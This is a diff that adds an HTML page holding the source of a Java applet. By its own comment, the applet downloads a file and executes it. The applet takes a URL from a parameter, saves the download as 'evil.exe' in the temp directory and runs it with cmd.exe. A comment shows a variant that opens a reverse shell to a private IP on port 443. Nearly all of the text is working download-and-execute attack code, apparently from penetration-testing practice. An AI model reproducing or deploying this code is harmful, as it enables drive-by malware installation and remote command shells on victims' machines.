@@ -1,0 +1,59 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Java Applet</title>
+</head><body>import java.applet.*;<br/>
+import java.awt.*;<br/>
+import java.io.*;<br/>
+import java.net.URL;<br/>
+import java.util.*;<br/>
+<br/>
+/**<br/>
+* This Java applet will download a file and execute it.<br/>
+**/<br/>
+<br/>
+public class Java extends Applet {<br/>
+&nbsp; &nbsp; private Object initialized = null;<br/>
+&nbsp; &nbsp; public Object isInitialized()<br/>
+&nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; return initialized;<br/>
+&nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; public void init() {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Process f;&#09;&#09;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; try {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; String tmpdir = System.getProperty("java.io.tmpdir") + File.separator;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; String expath = tmpdir + "evil.exe";<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; String download = "";<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; download = getParameter("1");<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (download.length() &gt; 0) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // URL parameter<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; URL url = new URL(download);<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Get an input stream for reading<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; InputStream in = url.openStream();<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Create a buffered input stream for efficency<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; BufferedInputStream bufIn = new BufferedInputStream(in);<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; File outputFile = new File(expath);<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; OutputStream out = new BufferedOutputStream(new<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FileOutputStream(outputFile));<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; byte[] buffer = new byte[2048];<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; for (;;) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int nBytes = bufIn.read(buffer);<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (nBytes &lt;= 0) break;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; out.write(buffer, 0, nBytes);<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; out.flush();<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; out.close();<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; in.close();<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; f = Runtime.getRuntime().exec("cmd.exe /c " + expath); /* code like: Runtime.getRuntime().exec("cmd.exe /c " + expath + " 10.11.0.5 443 -e cmd.exe"); */<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; } catch(IOException e) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; e.printStackTrace();<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; /* ended here and commented out below for bypass */<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; catch (Exception exception)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exception.printStackTrace();<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; }<br/>
+}</body></html>
